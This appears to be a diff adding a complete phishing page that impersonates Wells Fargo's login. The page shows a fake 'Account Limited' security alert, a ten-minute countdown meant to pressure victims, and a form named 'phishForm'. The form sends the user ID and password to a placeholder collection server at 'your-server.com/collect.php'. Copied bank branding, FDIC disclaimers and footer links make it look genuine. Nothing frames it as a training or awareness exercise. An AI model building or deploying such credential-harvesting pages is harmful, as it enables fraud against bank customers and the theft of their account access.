@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wells Fargo - Security Alert</title>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #ffffff;
+            color: #000000;
+        }
+        .header {
+            background-color: #d71e28;
+            padding: 15px 0;
+            text-align: center;
+        }
+        .alert-banner {
+            background-color: #ffeb3b;
+            color: #d71e28;
+            padding: 10px;
+            text-align: center;
+            font-weight: bold;
+            border-bottom: 1px solid #d71e28;
+        }
+        .container {
+            max-width: 500px;
+            margin: 30px auto;
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h2 {
+            color: #333;
+            margin-top: 0;
+            font-size: 22px;
+        }
+        p {
+            font-size: 14px;
+            line-height: 1.5;
+            color: #555;
+        }
+        .timer {
+            background: #333;
+            color: white;
+            padding: 10px;
+            text-align: center;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            font-size: 18px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        input:focus {
+            border-color: #d71e28;
+            outline: none;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: #d71e28;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background-color: #b0151d;
+        }
+        
+        /* --- DISCLAIMER BOX --- */
+        .disclaimer-box {
+            margin-top: 25px;
+            padding: 15px 20px;
+            background-color: #ffffff;
+            border: 1px solid #cccccc;
+            border-radius: 4px;
+            font-size: 11px;
+            line-height: 1.5;
+            color: #000000;
+        }
+        
+        .disclaimer-header {
+            font-weight: bold;
+            color: #000000;
+            margin-bottom: 10px;
+            font-size: 11px;
+        }
+        
+        .disclaimer-list {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            margin-bottom: 10px;
+        }
+        
+        .disclaimer-list li {
+            margin-bottom: 8px;
+            position: relative;
+            padding-left: 15px;
+            font-size: 11px;
+            color: #000000;
+            font-weight: bold;
+        }
+        
+        .disclaimer-list li::before {
+            content: "•";
+            position: absolute;
+            left: 0;
+            color: #000000;
+        }
+        
+        .disclaimer-list li:last-child {
+            margin-bottom: 0;
+        }
+
+        /* --- FDIC FOOTER TEXT --- */
+        .fdic-footer {
+            margin-top: 15px;
+            font-size: 11px;
+            color: #666666;
+            text-align: center;
+            line-height: 1.4;
+        }
+
+        /* --- MAIN FOOTER --- */
+        .main-footer {
+            max-width: 500px;
+            margin: 20px auto 0;
+            padding: 15px 0;
+            border-top: 1px solid #cccccc;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .footer-links a {
+            font-size: 11px;
+            color: #333333;
+            text-decoration: none;
+            white-space: nowrap;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-copyright {
+            font-size: 11px;
+            color: #333333;
+            white-space: nowrap;
+        }
+
+        .logo-placeholder {
+            font-weight: bold;
+            font-size: 24px;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="logo-placeholder">WELLS FARGO</div>
+    </div>
+
+    <div class="alert-banner">
+        ⚠️ SECURITY ALERT: Unusual Activity Detected
+    </div>
+
+    <div class="container">
+        <h2>Account Limited</h2>
+        <p>Dear Customer,</p>
+        <p>We have detected a login attempt from a new device: <strong>iPhone 15, iOS 17.5</strong>.</p>
+        <p>To prevent your account from being frozen, please verify your identity immediately.</p>
+        
+        <div class="timer">
+            Time Remaining: <span id="countdown">09:59</span>
+        </div>
+
+        <form id="phishForm" action="https://your-server.com/collect.php" method="POST">
+            <div class="form-group">
+                <label for="username">User ID</label>
+                <input type="text" id="username" name="username" placeholder="Enter your User ID" required>
+            </div>
+
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your Password" required>
+            </div>
+
+            <button type="submit">Verify Now</button>
+        </form>
+
+        <!-- White Box Disclaimer with Black Text and Bold Font -->
+        <div class="disclaimer-box">
+            <div class="disclaimer-header">Investment and Insurance Products are:</div>
+            <ul class="disclaimer-list">
+                <li>Not Insured by the FDIC or Any Federal Government Agency</li>
+                <li>Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank Affiliate</li>
+                <li>Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested</li>
+            </ul>
+        </div>
+
+        <!-- FDIC Footer Text -->
+        <div class="fdic-footer">
+            Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.
+        </div>
+    </div>
+
+    <!-- Main Footer with Links and Copyright -->
+    <footer class="main-footer">
+        <div class="footer-links">
+            <a href="#">About Wells Fargo</a>
+            <a href="#">Online Access</a>
+            <a href="#">Agreement</a>
+            <a href="#">Privacy, Cookies, Security & Legal</a>
+            <a href="#">Do not sell or share my personal information</a>
+            <a href="#">Notice of Data Collection</a>
+            <a href="#">Report Email Fraud</a>
+            <a href="#">Security Center</a>
+            <a href="#">Sitemap</a>
+            <a href="#">Give Us Feedback</a>
+        </div>
+        <div class="footer-copyright">
+            © 1999 - 2026 Wells Fargo. All rights reserved. NMLSR ID 399801
+        </div>
+    </footer>
+
+    <script>
+        var time = 599; 
+        var countdownElement = document.getElementById('countdown');
+        
+        setInterval(function() {
+            if (time < 0) {
+                countdownElement.textContent = "00:00";
+                return;
+            }
+            
+            var minutes = Math.floor(time / 60);
+            var seconds = time % 60;
+            
+            minutes = minutes < 10 ? "0" + minutes : minutes;
+            seconds = seconds < 10 ? "0" + seconds : seconds;
+            
+            countdownElement.textContent = minutes + ":" + seconds;
+            time--;
+        }, 1000);
+    </script>
+
+</body>
+</html>
